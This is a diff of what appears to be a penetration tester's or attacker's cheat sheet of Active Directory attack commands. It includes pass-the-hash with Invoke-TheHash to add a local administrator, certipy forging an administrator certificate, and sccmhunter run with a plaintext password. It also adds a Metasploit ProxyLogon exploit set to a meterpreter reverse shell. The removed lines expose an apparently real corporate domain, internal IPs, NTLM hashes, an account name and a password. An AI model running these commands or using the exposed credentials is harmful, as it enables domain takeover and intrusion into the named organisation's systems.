@@ -491,7 +491,7 @@
 				cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
 				PS C:\Tools> Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"
 		
-		certipy-ad req -ca 'kuban-KSZI-ADM-CA-CA' -dc-ip 10.12.112.4 -u 'GDK16100304$' -hashes 'c0eead2be2afd9165637cdadb0e94e44' -template 'RDSCertificateTemplate' -target 'kszi-adm-ca.kuban.gazprom.ru' -upn 'administrator@kuban.gazprom.ru' -sid 'S-1-5-21-73586283-839522115-1060284298-500'
+		certipy-ad req -ca 'CA-CA' -dc-ip 10.12.112.4 -u 'GDKJHB16100304$' -hashes 'c0eead2be2af489765t3d9165637cdadb0e94e44' -template 'template' -target 'fqdn_ca' -upn 'administrator@kaban.zazprom.ru' -sid 'S-1-5-21-73586283-32r23323-060284298-500'
 			
 		certipy-ad auth -pfx administrator.pfx
   		
@@ -1667,7 +1667,45 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 # SCCM (System Center Configuration Manager)
 
 	pipx install git+https://github.com/garrettfoster13/sccmhunter/
-	sccmhunter.py find -u adm.azukovskiy -p 'Apolon12!@' -d kuban.gazprom.ru -dc-ip 10.12.112.4 -debug
+	sccmhunter.py find -u adm -p 'Apolo' -d kaban.zazprom.ru -dc-ip 10.*.*.*-debug
 
 # Proxylogon
 	exploit(windows/http/exchange_proxylogon_rce)
+msf exploit(windows/http/exchange_proxylogon_rce)
+
+Name              Current Setting                   Required  Description
+   ----              ---------------                   --------  -----------
+   EMAIL             admin@mail.ru						yes       A known email address for this organization
+   METHOD            POST                              yes       HTTP Method to use for the check (Accepted: GET, POST)
+   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
+   RHOSTS            10.10.6.20                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT             443                               yes       The target port (TCP)
+   SSL               true                              no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                             no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH           /owa                              no        The URI to use for this exploit (default is random)
+   UseAlternatePath  false                             yes       Use the IIS root dir as alternate path
+   VHOST                                               no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.12.116.43 	  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Powershell
